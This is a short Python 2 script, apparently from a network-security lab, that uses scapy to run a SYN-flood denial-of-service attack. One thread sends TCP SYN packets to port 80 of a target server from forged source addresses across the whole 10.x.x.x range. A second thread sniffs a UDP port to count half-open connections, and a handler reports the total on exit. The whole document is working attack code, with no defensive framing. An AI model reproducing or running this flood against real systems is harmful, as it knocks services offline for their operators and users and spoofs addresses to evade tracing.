from scapy.all import *
import atexit

import threading
from threading import Thread


SERVER_IP = "192.168.1.112"


LISTENER_PORT = 49174 # port on which i'm listeting


attackSize = 0
counter = 0
seq = 1000
sport = 49173
dport = 80



def exit_handler():
	print '\n\nThe number of max tcp complete append is:'+str(counter)

atexit.register(exit_handler)




## Define our Custom Action function
def custom_action(packet):
	#print packet.show()
	global counter
	counter += 1
	
def func1():
	# Setup sniff, filtering for IP traffic
	sniff(iface= "enp0s3", filter="udp and dst port "+str(LISTENER_PORT), prn=custom_action)
			


def func2():
	# SYN injection generator
	global attackSize
	s = conf.L3socket(iface='enp0s3')
	for z in range(1, 254):
		for y in range(1, 254):
			for x in range(1, 254):
				attackSize = attackSize + 1
				stringIp = '10.'+ str(z)+"."+ str(y)+"."+ str(x)
				print "Attack size:"+ str(attackSize)+' Number of Half Connection Established: '+str(counter)

				ip = IP(src=stringIp, dst=SERVER_IP)
				syn = TCP(sport=sport, dport=dport, flags='S', seq=seq)
				packet = ip/syn
				s.send(packet)
				
				
if __name__ == '__main__':
    Thread(target = func1).start()
    Thread(target = func2).start()
	
	
	
		
